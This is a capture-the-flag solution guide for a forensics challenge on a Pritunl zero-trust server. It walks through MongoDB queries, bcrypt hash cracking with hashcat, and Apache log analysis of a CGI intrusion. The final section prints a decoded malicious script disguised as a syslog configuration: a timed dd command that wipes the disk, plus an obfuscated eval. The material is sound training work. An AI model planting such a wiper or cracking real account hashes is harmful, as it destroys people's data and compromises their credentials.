# Logic Zero

*Solution Guide*

## Overview

*Logic Zero* requires the competitor to find the intrusion to a zero trust environment. Competitors examine a MongoDB, weak credential hashes, and Apache2 logs.

## Question 1

*What agent's account was compromised? Only enter the three digits.*

1. On the **Pritunl** machine, find the credentials to the web interface by running the command: 

```bash
sudo pritunl-zero default-password
```
2. Using Firefox, browse to `https://zero.merch.codes` and log in with the credentials found in the previous command.

3. Click the **Users** tab. Notice there are ~500 agents. Click **agent-001** to examine the User Info. It shows *Last Active*; therefore, since the attack is underway, we need to find a better way to examine the most recent *Last Active* across all users.

4. On the Pritunl machine's terminal, enter the following command.

```bash
mongo
show databases
use pritunl-zero
show collections
```

5. Then, the following command (within MongoDB) to view the sessions.

```
db.sessions.find()
```
It does not appear that the data within the sessions collection is of much help. 

6. Explore the **users** collection:

```
db.users.find()
```
Here we see multiple **field:value** pairs within each agent that would be helpful. **Username** and **last_active** are very interesting. 

7. Run the following command within MongoDB to view the user who was most recently active.

```
db.users.find().sort({ last_active: -1 }).limit(1).pretty()
```

8. The output may show you your own activity as the *pritunl* user. You may need to explore the _second most recent_ username with the following command.

```
db.users.find().sort({ last_active: -1 }).limit(2).pretty()
```

You should  see `agent-xxx`. The three digits (xxx) are the answer to Question 1.

## Question 2

*What was this agent's weak password that was compromised?*

1. If you aren't in the MongoDB with the agent's information, run the following commands to get back to this location.

```bash
mongo
show databases
use pritunl-zero
show collections
db.users.find().sort({ last_active: -1 }).limit(2).pretty()
```

2. Within the `agent-xxx` data, you should see an encrypted password (e.g., $2a$10$Q7sCARin8uTGnlotr63bDeVtxrPpL0sbckZkqd5vHBH8MOIMu3C7i). Copy this encrypted password (hash) to a file called **hash.txt** on the Kali machine.
3. Since we know this password is four hexadecimal characters, run this command to crack this hash. 

```bash
sudo hashcat -m 3200 -a 3 hash.txt -1 0123456789abcdef ?1?1?1?1
```

It may take up to 30 minutes for this hash to crack. We recommend continuing the challenge while this is cracking.

## Question 3

*What is the filename, not extension, of the web resource utilized to gain initial access?*

1. Navigate to the **apache2** directory using:

```bash
cd /var/log/apache2/
```

2. View the files in this directory:

```bash
ls
```

3. We see two files of interest, **access.log** and **error.log**. 

4. View the contents of access.log.

```bash
cat access.log
```

5. We see tens of thousands of lines. Let's look for only **200 OK** results using the following command.

```bash
cat access.log | grep -a 200
```

6. Now we see results that may contain a 200 HTTP status code. Sifting through these logs, we see the cgi mentioned. Let's find the first cgi log file with a 200 HTTP status code.

```bash
cat access.log | grep -a 200 | grep -a cgi
```

7. Here we see `GET /cgi-bin/2335.cgi` (your four digits will vary). We see commands were passed in by this method. The answer to Question 3, in this example, is `2335`.

## Question 4

*What is the Epoch time (UTC) when the system is set to destroy itself?*

1. Navigate to the **apache2** directory:

```bash
cd /var/log/apache2/
```

2. Within the **access.log** files, you may notice some base32 and/or base64. Decode those strings:

```bash
base32 -d MNUG233EEAVXQIBPOVZXEL3TMJUW4L3UON4XG3DPM4FA====
base64 -d yourstringgoeshere
```

3. You may see **service** and **service.service**. Run the command below to see if service.service is still available on the webserver.

```bash
sudo find / -name service.service
```

You should not be able to find any service.service file on your system (it has been moved/renamed, but we don't know that, yet). 

4. Decode all base32 and base64 strings found in access.log.

```bash
cat access.log | grep -a echo
echo -n base64stringgoeshere | base64 -d
echo -n base32stringgoeshere | base32 -d
```

In one of these files you should get something similar to this:

```bash
#!/bin/bash

#Default tsyslog configuration

tt=1704067200
rt=$((tt - $(date +%s)))

if [[ $rt -gt 0 ]]; then
  sleep $rt
  #Clear cache
  dd IF=/dev/zero OF=/ 
  secret_code="7h15_15_4w350m3!"
  eval "$(echo "$secret_code" | tr 'a-zA-Z0-9' 'n-za-mN-ZA-M5-90-4')"
else
  sleep 86400
  /usr/sbin/tsyslog
fi
```

**tsyslog** is not a real syslog service. As we can see here, the `tt` appears to be a target time in epoch and when the remaining time (`rt`) reaches zero, the `dd` command will overwrite everything with zeros (which is not good). The value assigned to the `tt` variable is the answer to Question 4.
